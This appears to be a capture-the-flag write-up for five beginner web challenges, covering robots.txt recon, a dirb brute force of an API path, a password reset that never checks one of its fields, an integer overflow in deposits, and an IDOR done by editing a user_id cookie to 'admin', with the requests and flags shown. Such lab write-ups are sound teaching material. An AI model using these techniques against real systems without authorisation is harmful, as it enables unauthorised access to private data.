# BugCrowdCTF

# Web Challenges

## Challenge: Test In Prod

### Category: Web(75)

### Description:

You've discovered a seemingly simple login portal for a company's internal tool. The developers have claimed it's secure, but rumor has it that there's a hidden admin API endpoint they forgot to secure. Can you find it and access the secret flag?

### Initial Obs:

There is clear indication of what we have to do in the description. We have to find a hidden admin api endpoint. In basic recon, I checked the robots.txt file and it gave a lot of hints.  

### Tools:

dirb → to brute force the directory

### Solution:

hitting the /robots.txt endpoint, we get 

```python
User-agent: * Disallow: /admin Disallow: /api/v1/ # TODO: Remove development API endpoints before final deployment
```

So, it can predicted that the flag is in some endpoint of the api “/api/v1”, we run a dir brute force on this endpoint….

```python
dirb http://web.challenges.bhusa.bugcrowdctf.com:9110/api/v1/ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

This gives us the endpoint /api/v1/flag, which we can hit to find the flag.

![chrome_X2DuFy7m6K.png](BugCrowdCTF%202483c5d54c76803b939fd50889299256/chrome_X2DuFy7m6K.png)

### Final Flag: `FLAG{h1dd3n_4p1_3ndp01nt_f0und`

---

## Challenge: **Need A Reset**

### Category: Web(75)

### Description:

Your goal is to gain access to the system administration area.

### Initial Obs:

There is a login form with a reset password button. Also, there is a page for employees, where there details are provided, which may potentially data for resetting password.

### Tools:

No tools

### Solution:

Taking data from the employee directory page, we put the username of the admin → “admin” into the login form and reset_password, which asked for simple details from the employee directory page. There was a field dog_name which was not given in the directory, but i checked it first with a gibberish value and it worked. Concluded that it does not check the dog name. 
When i input the right details it, gives me the flag. 

### Final Flag: FLAG{Public_Info_Is_Not_A_S3cret!}

---

## Challenge: Over Bank

### Category: Web(50)

### Description:

Welcome to the Over Bank Secure Bank Deposit System! Our cutting-edge financial platform implements robust security measures that our engineering team guarantees will prevent any balance manipulation:

**Positive-only deposits** with strict validation preventing any withdrawal attempts

**Real-time balance tracking** with comprehensive overflow protection

**Advanced arithmetic safeguards** using industry-standard integer handling

Our security team has extensively tested the system and believes it's mathematically impossible to achieve a negative balance through deposits alone. The system only allows positive money additions and validates all arithmetic operations.

### Initial Obs:

The goal is unclear at first when you read the description. The goal becomes clear. You have to make a negative balance

### Tools:

No tools.

### Solution:

The website demands users to get a negative balance by depositing amount into the bank. At first i tried adding negative amount, but it had a filter for it, so It did not work. So, the only way a number can be negative after adding is when an overflow happens. If you have done DSA problems, you may have come across this. So, i just kept adding millions of dollars until it gave the flag.

![chrome_haEl3qNvh6.png](BugCrowdCTF%202483c5d54c76803b939fd50889299256/chrome_haEl3qNvh6.png)

### Final Flag: **FLAG{f1l1ng_c4b1n3t_0v3rfl0w_d3p0s1t_m4st3r}**

---

## Challenge: Open Sesame

### Category: Web(50)

### Description:

You've discovered a new note-taking service. The developer claims it's secure because each user can only access their own notes. However, rumors suggest there's a special note that only admins can see, containing a secret flag. Can you find a way to access it?

### Initial Obs:

On seeing the interface of the website at a glance. There is a certain user_id provided. So, it clicks that there might be idor(Insecure Direct Object Reference) present. So, I do a basic recon of how the request and proceed from there

### Tools:

Burp Suite 

### Solution:

the request i intercepted → 

```python
GET / HTTP/1.1
Host: web.challenges.bhusa.bugcrowdctf.com:9103
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: AWSALB=XTa3dBYkL7zcvOxAmct3GGB8+JeUx4GYA3NBeRWvIlR3IMgSmSKTobMVzahGyBYgpmjesKxIabPQkazjMyTUUBL/ZNpjcrCN22bkUpfz5AQG9BCo7ctq2IjEfHLX; user_id=<user_id>
Connection: keep-alive
```

We change the user_id field to admin and expolit the idor vuln → 

```python
GET / HTTP/1.1
Host: web.challenges.bhusa.bugcrowdctf.com:9103
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: AWSALB=XTa3dBYkL7zcvOxAmct3GGB8+JeUx4GYA3NBeRWvIlR3IMgSmSKTobMVzahGyBYgpmjesKxIabPQkazjMyTUUBL/ZNpjcrCN22bkUpfz5AQG9BCo7ctq2IjEfHLX; user_id=admin
Connection: keep-alive
```

![VirtualBoxVM_UtPj6SocG5.png](BugCrowdCTF%202483c5d54c76803b939fd50889299256/VirtualBoxVM_UtPj6SocG5.png)

### Final Flag: FLAG{insecur3_cookie_m4nipul4tion}

---

## Challenge: **Robots' Secrets**

### Category: Web(25)

### Description:

Welcome to our humble website! We're just getting started and are trying to keep some parts of our site private from search engines. Can you find anything interesting we might have overlooked?

### Initial Obs:

From the name, it is evident that the flag might be in the robots.txt endpoint of the website

### Tools:

No tools 

### Solution:

hitting the /robots.txt endpoint , we get 

```python
User-agent: *
Disallow: /hidden_area_for_bots/
```

hitting the /hidden_area_for_bots endpoint we get the flag

![chrome_B4uYrTL4vZ.png](BugCrowdCTF%202483c5d54c76803b939fd50889299256/chrome_B4uYrTL4vZ.png)

### Final Flag: FLAG{r0b0ts_kn0w_@ll_th3_s3cr3ts!}

---